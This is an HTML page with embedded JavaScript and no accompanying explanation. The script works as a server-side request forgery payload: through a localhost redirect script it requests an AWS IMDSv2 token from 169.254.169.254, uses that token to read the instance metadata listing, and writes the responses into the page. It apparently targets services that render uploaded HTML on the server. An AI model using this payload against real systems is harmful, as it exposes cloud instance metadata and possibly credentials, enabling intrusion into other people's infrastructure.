<html>
    <h1>hello there</h1>
    <div id="tokenResponse"></div>
    <div id="metadataResponse"></div>
    <div id="error"></div>
    <script>
        var tokenRequestUrl  = "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token";
        var metadataRequestUrl = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/";
        var httpRequest  = new XMLHttpRequest();
        var metadataToken = '';
        try {
            httpRequest.open('PUT', tokenRequestUrl, false);
            httpRequest.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
            httpRequest.send();
            metadataToken = httpRequest.responseText;
            document.getElementById("tokenResponse").innerHTML = "Token: " + metadataToken;

            httpRequest.open('GET', metadataRequestUrl, false);
            httpRequest.setRequestHeader('X-aws-ec2-metadata-token', metadataToken);
            httpRequest.send();
            document.getElementById("metadataResponse").innerHTML = httpRequest.responseText;
        } catch(error) {
            document.getElementById('error').innerHTML = error.message;
        }
    </script>
</html>
